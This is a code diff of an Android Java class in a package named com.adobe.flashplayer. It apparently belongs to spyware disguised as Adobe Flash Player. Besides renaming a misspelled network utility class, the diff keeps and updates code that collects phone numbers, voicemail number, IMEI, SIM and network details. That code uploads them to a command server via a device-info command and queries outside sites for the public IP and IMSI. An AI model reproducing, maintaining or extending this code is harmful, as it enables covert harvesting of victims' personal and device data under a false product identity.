@@ -17,7 +17,6 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import org.json.JSONObject;
 import android.annotation.SuppressLint;
-import android.annotation.TargetApi;
 import android.app.ActivityManager;
 import android.app.ActivityManager.MemoryInfo;
 import android.content.Context;
@@ -38,11 +37,11 @@ import android.text.format.Formatter;
 import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
-import androidx.core.content.ContextCompat;
+
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.MyLog;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -139,8 +138,8 @@ public class PhoneInformation {
                     countryCode = "CN";
                 }
                 simnetwork = tm.getNetworkOperator();
-                int onlinetype = NetworkUitls.getNetworkType(context);
-                if (onlinetype  == NetworkUitls.WIRELESS_CONNECTION)
+                int onlinetype = NetworkUtils.getNetworkType(context);
+                if (onlinetype  == NetworkUtils.WIRELESS_CONNECTION)
                 {
                     simnetworkType = "wireless";
                 }
@@ -246,7 +245,7 @@ public class PhoneInformation {
             jsojbj.put("手机号码2", phone[1]);
             jsojbj.put("语音信箱", voiceMailNumber);
 
-            if (NetworkUitls.isNetworkAvailable(context)) {
+            if (NetworkUtils.isNetworkAvailable(context)) {
                 UploadData.upload(jsojbj.toString().getBytes(), jsojbj.toString().getBytes().length, Public.CMD_DATA_DEVICEINFO, Public.IMEI);
             }
             else{
@@ -601,7 +600,7 @@ public class PhoneInformation {
         try {
             //String urlString = "http://icanhazip.com/";
             String urlString = "http://api.ipify.org/";
-            ipstr = NetworkUitls.sendHttpGet(context,"GET",urlString,"", "");
+            ipstr = NetworkUtils.sendHttpGet(context,"GET",urlString,"", "");
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -621,7 +620,7 @@ public class PhoneInformation {
             String stryear = String.valueOf(year);
 
             String urlString = "http://" + stryear + ".ip138.com/";
-            String ipstr = NetworkUitls.sendHttpGet(context,"GET",urlString,"", "");
+            String ipstr = NetworkUtils.sendHttpGet(context,"GET",urlString,"", "");
             //String ipstr = HttpUtils.sendHttpGet(context,"GET","http://2019.ip138.com/ic.asp","", "", "", "");
             if (ipstr != null) {
                 int pos = ipstr.indexOf("<center>");
@@ -655,7 +654,7 @@ public class PhoneInformation {
     public static String getNetIPFromChinaz(Context context){
         String ip="";
         try{
-            String result = NetworkUitls.sendHttpGet(context,"GET","http://ip.chinaz.com/","","");//http://ip.chinaz.com is error?
+            String result = NetworkUtils.sendHttpGet(context,"GET","http://ip.chinaz.com/","","");//http://ip.chinaz.com is error?
 
             Pattern p = Pattern.compile("\\<dd class\\=\"fz24\">(.*?)\\<\\/dd>");
             Matcher m = p.matcher(result.toString());
@@ -681,7 +680,7 @@ public class PhoneInformation {
             return "";
         }
 
-        String result = NetworkUitls.sendHttpGet(context,"GET","http://the-x.cn/imsi.aspx" + "#" +"imsi=" + imsi,"","");
+        String result = NetworkUtils.sendHttpGet(context,"GET","http://the-x.cn/imsi.aspx" + "#" +"imsi=" + imsi,"","");
         if(result == null || result.equals("") == true){
             return "";
         }
